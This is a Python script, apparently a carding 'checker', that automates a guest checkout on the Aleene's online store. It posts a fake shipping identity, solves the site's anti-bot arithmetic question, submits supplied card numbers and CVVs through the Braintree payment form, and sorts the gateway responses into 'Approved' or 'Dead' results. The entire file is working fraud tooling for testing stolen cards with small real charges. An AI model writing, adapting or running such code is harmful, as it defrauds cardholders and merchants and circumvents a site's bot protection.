from utilsdf.functions import capture, clean_text
from httpx import AsyncClient
import json


async def ka(cc, month, year, cvv):
    async with AsyncClient(
        follow_redirects=True,
        verify=False,
    ) as session:

        h = {
            "Host": "www.aleenes.com",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.aleenes.com",
            "referer": "https://www.aleenes.com/aleenes-tacky-pack-trial-size-3-pack",
        }

        p = "review_title=&review_content=&display_name=&email=&addtocart_1473.EnteredQuantity=1&review_title=&review_content=&display_name=&email="

        r = await session.post(
            "https://www.aleenes.com/addproducttocart/details/1473/1",
            headers=h,
            data=p,
        )

        h2 = {
            "Host": "www.aleenes.com",
            "origin": "https://www.aleenes.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.aleenes.com/checkout/customer-information",
        }

        p2 = "NewAddress.Id=0&NewAddress.CountryId=1&NewAddress.Email=sachiopremiun%40gmail.com&NewAddress.FirstName=Sachio&NewAddress.LastName=YT&NewAddress.Address1=118+W+132nd+St&NewAddress.Address2=&NewAddress.City=New+York&NewAddress.StateProvinceId=40&NewAddress.ZipPostalCode=10027&NewAddress.PhoneNumber=19006318646&nextstep=Next"

        r2 = await session.post(
            "https://www.aleenes.com/checkout/customer-information",
            headers=h2,
            data=p2,
        )

        h3 = {
            "Host": "www.aleenes.com",
            "origin": "https://www.aleenes.com",
            "content-type": "application/x-www-form-urlencoded",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
            "referer": "https://www.aleenes.com/checkout/shipping-method",
        }

        p3 = "shippingoption=Ground___Shipping.FixedRate&nextstep=Next"

        r3 = await session.post(
            "https://www.aleenes.com/checkout/shipping-method",
            headers=h3,
            data=p3,
        )
        t3 = r3.text
        t33 = clean_text(t3)
        aq_1 = capture(t33, "Answer This Question ? ", " +")
        aq_2 = capture(t33, f"Answer This Question ? {aq_1} + ", " CustomConfirmOrder")
        if aq_1 == None:
            aq_1 = "1"
            aq_2 = "1"
        aq_1 = int(aq_1)
        aq_2 = int(aq_2)
        rq = aq_1 + aq_2

        h4 = {
            "Host": "www.aleenes.com",
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Mobile Safari/537.36",
            "origin": "https://www.aleenes.com",
            "referer": "https://www.aleenes.com/checkout/payment-method",
        }

        p4 = f"paymentmethod=Payments.BrainTree&CardholderName=Sachio+YT&CardNumber={cc}&ExpireMonth={month}&ExpireYear={year}&CardCode={cvv}&billingAddressType=Same+as+shipping+address&billing_address_id=58683&BillingNewAddress.Id=0&BillingNewAddress.CountryId=1&BillingNewAddress.Email=&newsletteractive=on&BillingNewAddress.FirstName=&BillingNewAddress.LastName=&BillingNewAddress.Address1=&BillingNewAddress.Address2=&BillingNewAddress.City=&BillingNewAddress.StateProvinceId=0&BillingNewAddress.ZipPostalCode=&BillingNewAddress.PhoneNumber=&ValidateValueAnswer={rq}"

        r4 = await session.post(
            "https://www.aleenes.com/newcheckout/OpcCustomConfirmOrder/",
            headers=h4,
            data=p4,
        )

        p5 = f"paymentmethod=Payments.BrainTree&CardholderName=Sachio+YT&CardNumber={cc}&ExpireMonth={month}&ExpireYear={year}&CardCode={cvv}&billingAddressType=Same+as+shipping+address&billing_address_id=58683&BillingNewAddress.Id=0&BillingNewAddress.CountryId=1&BillingNewAddress.Email=&newsletteractive=on&BillingNewAddress.FirstName=&BillingNewAddress.LastName=&BillingNewAddress.Address1=&BillingNewAddress.Address2=&BillingNewAddress.City=&BillingNewAddress.StateProvinceId=0&BillingNewAddress.ZipPostalCode=&BillingNewAddress.PhoneNumber=&ValidateValueAnswer={rq}&Password=&ConfirmPassword=&GuestPopup=Option3"

        r5 = await session.post(
            "https://www.aleenes.com/newcheckout/OpcCustomConfirmOrder?guestOrderType=1",
            headers=h4,
            data=p5,
        )
        t5 = r5.text
        msg2 = json.dumps(json.loads(t5), indent=4)
        msg = capture(
            msg2,
            "Payment error: plugins.payments.braintree.errors.errorprocessingpayment",
            "</li>",
        )

        if r5.status_code == 302:
            status = "Approved! ✅ -» charged!"
            msg = "Thanks $3.99"
        elif msg == "Gateway Rejected: avs":
            status = "Approved! ✅ -» avs"
        elif msg == "Insufficient Funds":
            status = "Approved! ✅ -» low funds"
        elif (
            msg == "Card Issuer Declined CVV"
            or msg == "Gateway Rejected: cvv"
            or msg == "Gateway Rejected: avs_and_cvv"
        ):
            status = "Approved! ✅ -» ccn"
        else:
            status = "Dead! ❌"

        return status, msg
